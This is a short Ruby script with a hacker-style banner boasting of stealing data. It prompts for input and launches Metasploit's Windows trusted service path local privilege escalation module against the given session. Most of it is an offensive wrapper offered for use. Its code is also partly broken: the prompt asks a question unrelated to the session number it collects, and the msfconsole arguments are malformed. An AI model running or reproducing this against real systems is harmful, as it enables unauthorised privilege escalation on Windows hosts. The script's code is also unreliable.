puts """

 	  Th3 M4d_Sc13nT15t is here to stay...
         Im coming coming to steal your data...

      Windows Service Trusted Path Privilege Escalation

"""

puts " [?] What is the Windows Trusted Path? "
print "[!] --->"

target = gets.chomp



exec("msfconsole -x 'exploit/windows/local/trusted_service_path' -x 'set SESSION #{target}'  'run'")

